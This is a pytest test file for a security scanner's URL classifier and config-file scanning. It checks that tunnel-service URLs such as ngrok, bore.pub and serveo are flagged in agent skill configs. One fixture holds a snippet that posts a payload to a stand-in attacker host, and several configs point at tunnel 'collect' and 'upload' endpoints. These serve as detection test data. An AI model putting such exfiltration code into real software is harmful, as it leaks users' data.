# Copyright 2026 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Tests for the shared URL classifier and config-file URL scanning."""

import pytest

from skill_scanner.core.analyzers.static import StaticAnalyzer
from skill_scanner.core.models import Severity
from skill_scanner.core.static_analysis.context_extractor import ContextExtractor
from skill_scanner.core.static_analysis.url_classifier import (
    LEGITIMATE_DOMAINS,
    SUSPICIOUS_DOMAINS,
    classify_url,
    extract_urls,
)

_RULE_ID = "CONFIG_SUSPICIOUS_URL"


class TestUrlClassifier:
    def test_suspicious_domain(self):
        assert classify_url("https://abc.ngrok-free.dev/collect") == "suspicious"

    def test_legitimate_domain(self):
        assert classify_url("https://api.openai.com/v1/chat") == "legitimate"

    def test_unknown_domain(self):
        assert classify_url("https://example.org/api") == "unknown"

    def test_legitimate_takes_precedence(self):
        # A URL that contains both a legitimate and suspicious substring is legitimate.
        assert classify_url("https://api.openai.com/ngrok.io") == "legitimate"

    def test_extract_urls_dedup_and_order(self):
        text = "see https://a.ngrok.app/x and https://b.bore.pub/y and https://a.ngrok.app/x"
        assert extract_urls(text) == ["https://a.ngrok.app/x", "https://b.bore.pub/y"]

    def test_extract_urls_strips_trailing_punctuation(self):
        assert extract_urls("go to https://evil.example.com/path.") == ["https://evil.example.com/path"]


class TestRefactorSafety:
    """The extraction into url_classifier must not change ContextExtractor behavior."""

    def test_context_extractor_reuses_shared_lists(self):
        assert ContextExtractor.SUSPICIOUS_DOMAINS is SUSPICIOUS_DOMAINS
        assert ContextExtractor.LEGITIMATE_DOMAINS is LEGITIMATE_DOMAINS

    def test_context_extractor_still_flags_suspicious_url(self):
        source = (
            "import requests\n"
            "def send(payload):\n"
            '    url = "https://evil.example.com/collect"\n'
            "    requests.post(url, json=payload)\n"
        )
        context = ContextExtractor().extract_context("send.py", source)
        assert any("evil.example.com" in u for u in context.suspicious_urls)

    def test_context_extractor_ignores_legitimate_url(self):
        source = (
            "import requests\n"
            "def send(payload):\n"
            '    url = "https://api.openai.com/v1/chat/completions"\n'
            "    requests.post(url, json=payload)\n"
        )
        context = ContextExtractor().extract_context("send.py", source)
        assert context.suspicious_urls == []


@pytest.fixture(scope="module")
def analyzer() -> StaticAnalyzer:
    return StaticAnalyzer(use_yara=False)


class TestConfigFileScanning:
    def test_yaml_tunnel_url_flagged(self, analyzer, make_skill):
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "config.yaml": "service:\n  base_url: https://xyz.ngrok-free.dev/api\n",
            }
        )
        findings = analyzer._scan_config_files(skill)
        assert len(findings) == 1
        assert findings[0].rule_id == _RULE_ID
        assert findings[0].severity == Severity.HIGH
        assert "ngrok-free.dev" in findings[0].metadata["url"]

    def test_legitimate_config_url_not_flagged(self, analyzer, make_skill):
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "config.yaml": "service:\n  base_url: https://api.openai.com/v1\n",
            }
        )
        assert analyzer._scan_config_files(skill) == []

    def test_json_config_flagged(self, analyzer, make_skill):
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "config.json": '{"endpoints": {"upload": "https://data.bore.pub/u"}}',
            }
        )
        findings = analyzer._scan_config_files(skill)
        assert len(findings) == 1
        assert "bore.pub" in findings[0].metadata["url"]

    def test_toml_config_flagged(self, analyzer, make_skill):
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "settings.toml": '[net]\nurl = "https://tunnel.serveo.net/x"\n',
            }
        )
        findings = analyzer._scan_config_files(skill)
        assert len(findings) == 1
        assert "serveo.net" in findings[0].metadata["url"]

    def test_malformed_yaml_falls_back_to_regex(self, analyzer, make_skill):
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "config.yaml": "this: is: not: valid: yaml: https://x.ngrok.app/c\n",
            }
        )
        findings = analyzer._scan_config_files(skill)
        assert len(findings) == 1
        assert "ngrok.app" in findings[0].metadata["url"]

    def test_non_config_file_ignored(self, analyzer, make_skill):
        # A data file that is not a recognized config name should not be scanned here.
        skill = make_skill(
            {
                "SKILL.md": "---\nname: cfg\ndescription: A test skill\n---\n# cfg\n",
                "data.yaml": "base_url: https://xyz.ngrok-free.dev/api\n",
            }
        )
        assert analyzer._scan_config_files(skill) == []
